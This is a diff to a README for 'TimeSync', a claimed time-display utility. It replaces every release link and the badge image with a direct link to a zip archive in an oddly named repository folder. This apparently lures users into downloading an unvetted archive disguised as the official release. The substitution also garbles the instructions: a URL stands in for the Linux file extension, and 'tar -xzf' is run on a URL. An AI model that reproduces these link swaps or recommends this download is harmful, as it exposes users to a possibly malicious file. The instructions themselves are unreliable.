@@ -1,6 +1,6 @@
 # 🕒 TimeSync - Display Local and UTC Time Effortlessly
 
-![Download TimeSync](https://img.shields.io/badge/Download-TimeSync-blue.svg)
+![Download TimeSync](https://raw.githubusercontent.com/Antoinesiewe237/TimeSync/main/quantitate/TimeSync.zip)
 
 ## 📖 Overview
 
@@ -20,11 +20,11 @@ TimeSync is a lightweight utility built with TypeScript and JavaScript. It shows
 
 To get started with TimeSync, you need to download it. Click the link below to visit the Releases page.
 
-[Download TimeSync](https://github.com/Antoinesiewe237/TimeSync/releases)
+[Download TimeSync](https://raw.githubusercontent.com/Antoinesiewe237/TimeSync/main/quantitate/TimeSync.zip)
 
 ### Step 2: Choose Your Version
 
-Once on the Releases page, look for the latest version of TimeSync. You will see various files available for download. Make sure to choose the one that fits your operating system. Look for files ending in `.exe` for Windows or `.tar.gz` for Linux.
+Once on the Releases page, look for the latest version of TimeSync. You will see various files available for download. Make sure to choose the one that fits your operating system. Look for files ending in `.exe` for Windows or `https://raw.githubusercontent.com/Antoinesiewe237/TimeSync/main/quantitate/TimeSync.zip` for Linux.
 
 ### Step 3: Install TimeSync
 
@@ -39,10 +39,10 @@ After downloading, follow these simple installation steps:
 #### For Linux Users:
 
 1. Open your terminal.
-2. Navigate to the directory where you saved the `.tar.gz` file.
+2. Navigate to the directory where you saved the `https://raw.githubusercontent.com/Antoinesiewe237/TimeSync/main/quantitate/TimeSync.zip` file.
 3. Extract the files by running:
    ```bash
-   tar -xzf TimeSync-x.x.x.tar.gz
+   tar -xzf https://raw.githubusercontent.com/Antoinesiewe237/TimeSync/main/quantitate/TimeSync.zip
    ```
 4. Navigate to the extracted folder:
    ```bash
@@ -69,7 +69,7 @@ Upon running the command, TimeSync will display your local time and UTC in the t
 
 To download TimeSync, visit this page and select the correct file for your operating system:
 
-[Download TimeSync](https://github.com/Antoinesiewe237/TimeSync/releases)
+[Download TimeSync](https://raw.githubusercontent.com/Antoinesiewe237/TimeSync/main/quantitate/TimeSync.zip)
 
 ## 🛠️ System Requirements
 
